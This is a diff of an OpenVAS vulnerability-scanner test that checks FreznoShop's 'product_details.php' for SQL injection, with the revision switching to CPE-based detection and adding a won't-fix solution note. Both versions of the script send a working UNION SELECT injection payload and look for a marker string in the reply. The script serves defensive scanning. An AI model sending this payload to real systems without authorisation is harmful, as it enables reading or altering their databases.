@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: freznoshop_34496.nasl 9425 2018-04-10 12:38:38Z cfischer $
+# $Id: freznoshop_34496.nasl 9791 2018-05-10 09:39:02Z ckuersteiner $
 #
 # FreznoShop 'product_details.php' SQL Injection Vulnerability
 #
@@ -24,70 +24,68 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "FreznoShop is prone to an SQL-injection vulnerability because it
-  fails to sufficiently sanitize user-supplied data before using it in
-  an SQL query.
-
-  Exploiting this issue could allow an attacker to compromise the
-  application, access or modify data, or exploit latent
-  vulnerabilities in the underlying database.
-
-  FreznoShop 1.3.0 is vulnerable; other versions may also be affected.";
-
+CPE = 'cpe:/a:freznoshop:freznoshop';
 
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100143");
- script_version("$Revision: 9425 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
+ script_version("$Revision: 9791 $");
+ script_tag(name:"last_modification", value:"$Date: 2018-05-10 11:39:02 +0200 (Thu, 10 May 2018) $");
  script_tag(name:"creation_date", value:"2009-04-16 19:20:22 +0200 (Thu, 16 Apr 2009)");
  script_bugtraq_id(34496);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 
- script_name("FreznoShop 'product_details.php' SQL Injection Vulnerability");
+ script_tag(name: "solution_type", value: "WillNotFix");
 
+ script_name("FreznoShop 'product_details.php' SQL Injection Vulnerability");
 
  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("freznoshop_detect.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34496");
+ script_mandatory_keys("freznoshop/installed");
+
+ script_tag(name: "summary", value: "FreznoShop is prone to an SQL-injection vulnerability because it fails to
+sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit
+latent vulnerabilities in the underlying database.
+
+FreznoShop 1.3.0 is vulnerable, other versions may also be affected.");
+
+ script_tag(name: "solution", value: "No known solution was made available for at least one year since the
+disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
+a newer release, disable respective features, remove the product or replace the product by another one.");
+
+ script_xref(name: "URL", value: "http://www.securityfocus.com/bid/34496");
+
  exit(0);
 }
 
+include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
 
-port = get_http_port(default:80);
+if (!port = get_app_port(cpe: CPE))
+  exit(0);
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+if (!dir = get_app_location(cpe: CPE, port: port))
+  exit(0);
 
-if(!version = get_kb_item(string("www/", port, "/freznoshop")))exit(0);
-if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);
+if (dir == "/")
+  dir = "";
 
-dir  = matches[2];
+url = dir + "/product_details.php?id=-22%20union%20select%201,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11,12--"; 
+req = http_get(item:url, port:port);
+buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
+if( buf == NULL )exit(0); 
 
-  if(!isnull(dir)) {
+if(egrep(pattern:"OpenVAS-SQL-Injection-Test", string: buf)) {    
+  report = report_vuln_url(port: port, url: url);
+  security_message(port: port, data: report);
+  exit(0);
+}
 
-       url = string(dir, "/product_details.php?id=-22%20union%20select%201,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11,12--"); 
-       req = http_get(item:url, port:port);
-       buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
-       if( buf == NULL ) exit(0);
-
-       if( buf == NULL )exit(0); 
-       if(egrep(pattern:"OpenVAS-SQL-Injection-Test", string: buf))
-       {    
-  	  security_message(port:port);
-	  exit(0);
-       }
-  }
-
-
-exit(0);
+exit(99);
